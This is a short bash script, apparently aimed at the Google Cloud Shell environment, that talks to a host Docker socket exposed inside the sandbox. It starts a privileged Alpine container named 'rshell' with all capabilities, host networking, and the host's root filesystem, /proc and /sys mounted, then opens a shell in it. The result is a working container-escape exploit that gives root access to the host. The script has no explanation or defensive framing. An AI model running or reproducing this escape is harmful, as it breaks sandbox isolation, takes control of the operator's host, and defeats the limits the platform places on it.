#!/bin/bash

set -ue

export host_docker_sock="unix:///google/host/var/run/docker.sock"

sudo docker -H ${host_docker_sock} pull alpine:latest
sudo docker -H ${host_docker_sock} run -d -it --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H ${host_docker_sock} start rshell
sudo docker -H ${host_docker_sock} exec -it rshell /bin/sh
